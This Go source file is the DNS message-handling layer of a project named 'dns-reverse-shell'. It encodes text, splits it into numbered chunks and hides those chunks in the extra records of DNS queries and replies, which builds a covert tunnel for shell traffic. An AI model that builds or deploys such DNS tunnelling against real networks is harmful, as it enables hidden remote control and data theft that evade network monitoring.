package protocol

import (
	"dns-reverse-shell/main/protocol/encoder"
	"fmt"
	"github.com/miekg/dns"
	"strconv"
)

type MessageHandler struct {
	encoder         encoder.StringEncoder
	messageSplitter MessageSplitter
}

func NewMessageHandler(encoder encoder.StringEncoder, messageSplitter MessageSplitter) *MessageHandler {
	return &MessageHandler{encoder: encoder, messageSplitter: messageSplitter}
}

func (m MessageHandler) createMessage() *dns.Msg {
	msg := new(dns.Msg)
	return msg
}

func (m MessageHandler) CreateAnswerMessage(r *dns.Msg, message string) *dns.Msg {
	msg := m.createMessage()
	msg.SetReply(r)
	msg.Authoritative = true
	encoded := m.encoder.Encode(message)
	msg.Extra = m.splitIntoDnsExtras(encoded)
	return msg
}

func (m MessageHandler) DecodeAnswerMsg(r *dns.Msg) string {
	collect := m.messageSplitter.Collect(r.Extra)
	return m.encoder.Decode(collect)
}

func (m MessageHandler) CreateQuestionMessage(messageType string, message string) []*dns.Msg {
	splitEncoded := m.encodeSplit(message)
	if len(splitEncoded) == 1 {
		return m.buildSmallMessageSlice(messageType, splitEncoded[0])
	} else {
		return m.buildBigMessageSlice(messageType, splitEncoded)
	}
}

func (m MessageHandler) buildBigMessageSlice(messageType string, splitEncoded []string) []*dns.Msg {
	var messages []*dns.Msg
	for i, _ := range splitEncoded {
		messageSlice := m.buildSmallMessageSlice(messageType, splitEncoded[i])
		messageSlice[0].Answer = m.buildDnsAnswer(i+1, len(splitEncoded))
		messages = append(messages, messageSlice[0])
	}
	fmt.Println("created message with " + strconv.Itoa(len(messages)) + " parts")
	return messages
}

func (m MessageHandler) buildSmallMessageSlice(messageType string, splitEncoded string) []*dns.Msg {
	msg := m.createMessage()
	msg.SetQuestion(dns.Fqdn(messageType), dns.TypeA)
	msg.Extra = m.splitIntoDnsExtras(splitEncoded)
	return []*dns.Msg{msg}
}

func (m MessageHandler) encodeSplit(msg string) []string {
	encoded := m.encoder.Encode(msg)
	if len([]byte(encoded)) > 150 {
		s1 := msg[:len(msg)/2]
		s2 := msg[len(msg)/2:]
		return append(m.encodeSplit(s1), m.encodeSplit(s2)...)
	}
	return []string{encoded}
}

func (m MessageHandler) splitIntoDnsExtras(encodedMsg string) []dns.RR {
	return m.messageSplitter.Split(encodedMsg)
}

func (m MessageHandler) buildDnsAnswer(currentIndex int, maxIndex int) []dns.RR {
	if currentIndex < maxIndex {
		return m.messageSplitter.Split(strconv.Itoa(currentIndex) + "/" + strconv.Itoa(maxIndex))
	} else {
		return m.messageSplitter.Split("end")
	}
}
